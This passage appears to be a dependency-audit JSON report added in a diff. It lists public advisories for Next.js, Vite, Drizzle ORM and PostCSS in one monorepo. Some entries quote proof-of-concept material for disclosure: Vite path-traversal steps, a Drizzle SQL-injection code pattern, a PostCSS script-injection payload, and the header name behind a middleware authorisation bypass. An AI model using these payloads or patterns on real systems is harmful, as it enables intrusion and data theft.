+      "overview": "A vulnerability affects certain React packages<sup>1</sup> for versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182). \n\nFixed in:\nReact: 19.0.1, 19.1.2, 19.2.1\nNext.js: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7, 15.6.0-canary.58, 16.1.0-canary.12+\n\nThe vulnerability also affects experimental canary releases starting with 14.3.0-canary.77. Users on any of the 14.3 canary builds should either downgrade to a 14.x stable release or 14.3.0-canary.76.\n\nAll users of stable 15.x or 16.x Next.js versions should upgrade to a patched, stable version immediately.\n\n<sup>1</sup> The affected React packages are:\n- react-server-dom-parcel\n- react-server-dom-turbopack\n- react-server-dom-webpack",
+      "reported_by": null,
+      "title": "Next.js is vulnerable to RCE in React flight protocol",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.3.0-canary.77 <15.0.5",
+      "github_advisory_id": "GHSA-9qr9-h5gf-34mp",
+      "recommendation": "Upgrade to version 15.0.5 or later",
+      "patched_versions": ">=15.0.5",
+      "updated": "2025-12-11T19:31:08.000Z",
+      "cvss": {
+        "score": 10,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-9qr9-h5gf-34mp"
+    },
+    "1111381": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-w37m-7fhw-fmv9\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55183\n- https://github.com/advisories/GHSA-w37m-7fhw-fmv9",
+      "created": "2025-12-11T22:49:56.000Z",
+      "id": 1111381,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55183](https://www.cve.org/CVERecord?id=CVE-2025-55183).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that can return the compiled source code of [Server Functions](https://react.dev/reference/rsc/server-functions). This could reveal business logic, but would not expose secrets unless they were hardcoded directly into [Server Function](https://react.dev/reference/rsc/server-functions) code.",
+      "reported_by": null,
+      "title": "Next Server Actions Source Code Exposure ",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0-canary.0 <15.0.6",
+      "github_advisory_id": "GHSA-w37m-7fhw-fmv9",
+      "recommendation": "Upgrade to version 15.0.6 or later",
+      "patched_versions": ">=15.0.6",
+      "updated": "2025-12-11T22:49:56.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-497",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-w37m-7fhw-fmv9"
+    },
+    "1111390": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://github.com/advisories/GHSA-mwv6-3258-q52c",
+      "created": "2025-12-11T22:49:27.000Z",
+      "id": 1111390,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next Vulnerable to Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0-canary.0 <15.0.6",
+      "github_advisory_id": "GHSA-mwv6-3258-q52c",
+      "recommendation": "Upgrade to version 15.0.6 or later",
+      "patched_versions": ">=15.0.6",
+      "updated": "2025-12-11T22:49:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-mwv6-3258-q52c"
+    },
+    "1112593": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-9g9p-9gw9-jx7f\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59471\n- https://github.com/vercel/next.js/commit/500ec83743639addceaede95e95913398975156c\n- https://github.com/vercel/next.js/commit/e5b834d208fe0edf64aa26b5d76dcf6a176500ec\n- https://github.com/vercel/next.js/releases/tag/v15.5.10\n- https://github.com/vercel/next.js/releases/tag/v16.1.5\n- https://github.com/advisories/GHSA-9g9p-9gw9-jx7f",
+      "created": "2026-01-27T19:18:25.000Z",
+      "id": 1112593,
+      "npm_advisory_id": null,
+      "overview": "A DoS vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\n\nStrongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+      "reported_by": null,
+      "title": "Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59471"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <15.5.10",
+      "github_advisory_id": "GHSA-9g9p-9gw9-jx7f",
+      "recommendation": "Upgrade to version 15.5.10 or later",
+      "patched_versions": ">=15.5.10",
+      "updated": "2026-01-27T19:18:28.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-9g9p-9gw9-jx7f"
+    },
+    "1112653": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg\n- https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23864\n- https://vercel.com/changelog/summary-of-cve-2026-23864\n- https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "created": "2026-01-28T15:38:01.000Z",
+      "id": 1112653,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0.0 <15.0.8",
+      "github_advisory_id": "GHSA-h25m-26qc-wcjf",
+      "recommendation": "Upgrade to version 15.0.8 or later",
+      "patched_versions": ">=15.0.8",
+      "updated": "2026-01-28T15:38:02.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-h25m-26qc-wcjf"
+    },
+    "1113688": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\n- https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\n- https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\n- https://nvd.nist.gov/vuln/detail/CVE-2025-29927\n- https://github.com/vercel/next.js/releases/tag/v12.3.5\n- https://github.com/vercel/next.js/releases/tag/v13.5.9\n- https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\n- http://www.openwall.com/lists/oss-security/2025/03/23/3\n- http://www.openwall.com/lists/oss-security/2025/03/23/4\n- https://security.netapp.com/advisory/ntap-20250328-0002\n- https://github.com/advisories/GHSA-f82v-jwr5-mffw",
+      "created": "2025-03-21T15:20:12.000Z",
+      "id": 1113688,
+      "npm_advisory_id": null,
+      "overview": "# Impact\nIt is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.\n\n# Patches\n* For Next.js 15.x, this issue is fixed in `15.2.3`\n* For Next.js 14.x, this issue is fixed in `14.2.25`\n* For Next.js 13.x, this issue is fixed in 13.5.9\n* For Next.js 12.x, this issue is fixed in 12.3.5\n* For Next.js 11.x, consult the below workaround.\n\n_Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability._\n\n# Workaround\nIf patching to a safe version is infeasible, we recommend that you prevent external user requests which contain the `x-middleware-subrequest` header from reaching your Next.js application.\n\n## Credits\n\n- Allam Rachid (zhero;)\n- Allam Yasser (inzo_)",
+      "reported_by": null,
+      "title": "Authorization Bypass in Next.js Middleware",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-29927"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <15.2.3",
+      "github_advisory_id": "GHSA-f82v-jwr5-mffw",
+      "recommendation": "Upgrade to version 15.2.3 or later",
+      "patched_versions": ">=15.2.3",
+      "updated": "2026-03-02T16:59:05.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-285",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
+    },
+    "1114897": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-ggv3-7p47-pfv8\n- https://github.com/vercel/next.js/commit/dc98c04f376c6a1df76ec3e0a2d07edf4abdabd6\n- https://github.com/vercel/next.js/releases/tag/v15.5.13\n- https://github.com/vercel/next.js/releases/tag/v16.1.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-29057\n- https://github.com/advisories/GHSA-ggv3-7p47-pfv8",
+      "created": "2026-03-17T16:17:15.000Z",
+      "id": 1114897,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nWhen Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes.\n\n## Impact\nAn attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel. \n\n## Patches\nThe vulnerability originated in an upstream library vendored by Next.js. It is fixed by updating that dependencyΓÇÖs behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path.\n\n## Workarounds\nIf upgrade is not immediately possible:\n- Block chunked `DELETE`/`OPTIONS` requests on rewritten routes at your edge/proxy.\n- Enforce authentication/authorization on backend routes per our [security guidance](https://nextjs.org/docs/app/guides/data-security).",
+      "reported_by": null,
+      "title": "Next.js: HTTP request smuggling in rewrites",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-29057"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=9.5.0 <15.5.13",
+      "github_advisory_id": "GHSA-ggv3-7p47-pfv8",
+      "recommendation": "Upgrade to version 15.5.13 or later",
+      "patched_versions": ">=15.5.13",
+      "updated": "2026-03-18T21:53:30.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-ggv3-7p47-pfv8"
+    },
+    "1114940": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3x4c-7xq6-9pq8\n- https://github.com/vercel/next.js/commit/39eb8e0ac498b48855a0430fbf4c22276a73b4bd\n- https://github.com/vercel/next.js/releases/tag/v16.1.7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-27980\n- https://github.com/advisories/GHSA-3x4c-7xq6-9pq8",
+      "created": "2026-03-17T16:17:06.000Z",
+      "id": 1114940,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nThe default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth.\n\n## Impact\nAn attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. Note that this does not impact platforms that have their own image optimization capabilities, such as Vercel.\n\n## Patches\nFixed by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. \n\n## Workarounds\nIf upgrade is not immediately possible:\n- Periodically clean `.next/cache/images`.\n- Reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)",
+      "reported_by": null,
+      "title": "Next.js: Unbounded next/image disk cache growth can exhaust storage",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-27980"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=10.0.0 <15.5.14",
+      "github_advisory_id": "GHSA-3x4c-7xq6-9pq8",
+      "recommendation": "Upgrade to version 15.5.14 or later",
+      "patched_versions": ">=15.5.14",
+      "updated": "2026-03-19T18:33:25.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-3x4c-7xq6-9pq8"
+    },
+    "1116229": {
+      "findings": [
+        {
+          "version": "5.4.21",
+          "paths": [
+            "apps\\web > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "apps\\web > vitest@2.1.9 > vite@5.4.21",
+            "apps\\web > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > vite@5.4.21",
+            "packages\\core > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-auth > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-catalog > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-credentials > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-learning > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > @vitest/mocker@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite@5.4.21",
+            "packages\\plugins\\plugin-localization > vitest@2.1.9 > vite-node@2.1.9 > vite@5.4.21"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-4w7w-66w2-5vf9\n- https://github.com/vitejs/vite/pull/22161\n- https://github.com/vitejs/vite/commit/79f002f2286c03c88c7b74c511c7f9fc6dc46694\n- https://github.com/vitejs/vite/releases/tag/v6.4.2\n- https://github.com/vitejs/vite/releases/tag/v7.3.2\n- https://github.com/vitejs/vite/releases/tag/v8.0.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39365\n- https://github.com/advisories/GHSA-4w7w-66w2-5vf9",
+      "created": "2026-04-06T18:03:46.000Z",
+      "id": 1116229,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nAny files ending with `.map` even out side the project can be returned to the browser.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- have a sensitive content in files ending with `.map` and the path is predictable\n\n### Details\n\nIn Vite v7.3.1, the dev serverΓÇÖs handling of `.map` requests for optimized dependencies resolves file paths and calls `readFile` without restricting `../` segments in the URL. As a result, it is possible to bypass the [`server.fs.strict`](https://vite.dev/config/server-options#server-fs-strict) allow list and retrieve `.map` files located outside the project root, provided they can be parsed as valid source map JSON.\n\n### PoC\n1. Create a minimal PoC sourcemap outside the project root\n    ```bash\n    cat > /tmp/poc.map <<'EOF'\n    {\"version\":3,\"file\":\"x.js\",\"sources\":[],\"names\":[],\"mappings\":\"\"}\n    EOF\n    ```\n2. Start the Vite dev server (example)\n    ```bash\n    pnpm -C playground/fs-serve dev --host 127.0.0.1 --port 18080\n    ```\n3. Confirm that direct `/@fs` access is blocked by `strict` (returns 403)\n    <img width=\"4004\" height=\"1038\" alt=\"image\" src=\"https://github.com/user-attachments/assets/15a859a8-1dc6-4105-8d58-80527c0dd9ab\" />\n4. Inject `../` segments under the optimized deps `.map` URL prefix to reach `/tmp/poc.map`\n    <img width=\"2790\" height=\"846\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d02957d-2e6a-4c45-9819-3f024e0e81f2\" />",
+      "reported_by": null,
+      "title": "Vite Vulnerable to Path Traversal in Optimized Deps `.map` Handling",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39365"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": "<=6.4.1",
+      "github_advisory_id": "GHSA-4w7w-66w2-5vf9",
+      "recommendation": "Upgrade to version 6.4.2 or later",
+      "patched_versions": ">=6.4.2",
+      "updated": "2026-04-07T22:16:29.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200"
+      ],
+      "url": "https://github.com/advisories/GHSA-4w7w-66w2-5vf9"
+    },
+    "1116251": {
+      "findings": [
+        {
+          "version": "0.36.4",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > drizzle-orm@0.36.4",
+            "apps\\web > drizzle-orm@0.36.4",
+            "packages\\core > drizzle-orm@0.36.4"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/drizzle-team/drizzle-orm/security/advisories/GHSA-gpj5-g38j-94v9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-39356\n- https://github.com/advisories/GHSA-gpj5-g38j-94v9",
+      "created": "2026-04-08T00:14:58.000Z",
+      "id": 1116251,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nDrizzle ORM improperly escaped quoted SQL identifiers in its dialect-specific `escapeName()` implementations. In affected versions, embedded identifier delimiters were not escaped before the identifier was wrapped in quotes or backticks.\n\nAs a result, applications that pass attacker-controlled input to APIs that construct SQL identifiers or aliases, such as `sql.identifier()`, `.as()`, may allow an attacker to terminate the quoted identifier and inject SQL.\n\n### Affected components\n\nThe issue affects the identifier escaping logic used by the PostgreSQL, MySQL, SQLite, SingleStore, and Gel dialects.\n\n### Impact\n\nThis issue only affects applications that pass untrusted runtime input into identifier or alias construction. Common examples include dynamic sorting, dynamic report builders, and CTE or alias names derived from request parameters.\n\nDepending on the database dialect, query context, and database permissions, successful exploitation may enable blind or direct data disclosure, schema enumeration, query manipulation, privilege escalation, or destructive operations.\n\nApplications that use only static schema objects, or that strictly map user input through an allowlist of known column or alias names, are not affected.\n\n### Details\n\nIn affected versions, `escapeName()` wrapped the identifier but did not escape the quote delimiter inside the identifier value:\n\n- PostgreSQL / SQLite / Gel: `\"` was not doubled to `\"\"`\n- MySQL / SingleStore: `` ` `` was not doubled to `` `` ``\n\nBecause of this, crafted input containing the dialect-specific identifier delimiter could break out of the quoted identifier and be interpreted as SQL syntax.\n\nA representative vulnerable pattern is dynamic sorting using untrusted input:\n\n```ts\nconst sortField = req.query.sort || 'id';\n\nconst rows = await db\n  .select()\n  .from(users)\n  .orderBy(sql.identifier(sortField));",
+      "reported_by": null,
+      "title": "Drizzle ORM has SQL injection via improperly escaped SQL identifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-39356"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "drizzle-orm",
+      "vulnerable_versions": "<0.45.2",
+      "github_advisory_id": "GHSA-gpj5-g38j-94v9",
+      "recommendation": "Upgrade to version 0.45.2 or later",
+      "patched_versions": ">=0.45.2",
+      "updated": "2026-04-08T00:14:59.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-89"
+      ],
+      "url": "https://github.com/advisories/GHSA-gpj5-g38j-94v9"
+    },
+    "1116376": {
+      "findings": [
+        {
+          "version": "15.0.3",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "apps\\web > next@15.0.3",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-q4gf-8mx6-v5v3\n- https://vercel.com/changelog/summary-of-cve-2026-23869\n- https://github.com/advisories/GHSA-q4gf-8mx6-v5v3",
+      "created": "2026-04-10T15:35:47.000Z",
+      "id": 1116376,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23869](https://github.com/facebook/react/security/advisories/GHSA-479c-33wc-g2pg). You can read more about this advisory our [this changelog](https://vercel.com/changelog/summary-of-cve-2026-23869).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next.js has a Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0.0 <15.5.15",
+      "github_advisory_id": "GHSA-q4gf-8mx6-v5v3",
+      "recommendation": "Upgrade to version 15.5.15 or later",
+      "patched_versions": ">=15.5.15",
+      "updated": "2026-04-10T15:35:49.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-q4gf-8mx6-v5v3"
+    },
+    "1117015": {
+      "findings": [
+        {
+          "version": "8.4.31",
+          "paths": [
+            "apps\\web > @hawza/core@link:../../packages/core > next-auth@5.0.0-beta.25 > next@15.0.3 > postcss@8.4.31",
+            "apps\\web > next@15.0.3 > postcss@8.4.31",
+            "apps\\web > next-auth@5.0.0-beta.25 > next@15.0.3 > postcss@8.4.31",
+            "packages\\core > next-auth@5.0.0-beta.25 > next@15.0.3 > postcss@8.4.31"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41305\n- https://github.com/postcss/postcss/releases/tag/8.5.10\n- https://github.com/advisories/GHSA-qx2v-qp2m-jg93",
+      "created": "2026-04-24T15:31:42.000Z",
+      "id": 1117015,
+      "npm_advisory_id": null,
+      "overview": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; }\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n\n## Suggested Fix\n\nEscape `</style` in all stringified output values:\n```javascript\noutput = output.replace(/<\\/(style)/gi, '<\\\\/$1');\n```\n\n## Credits\nDiscovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))",
+      "reported_by": null,
+      "title": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41305"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.5.10",
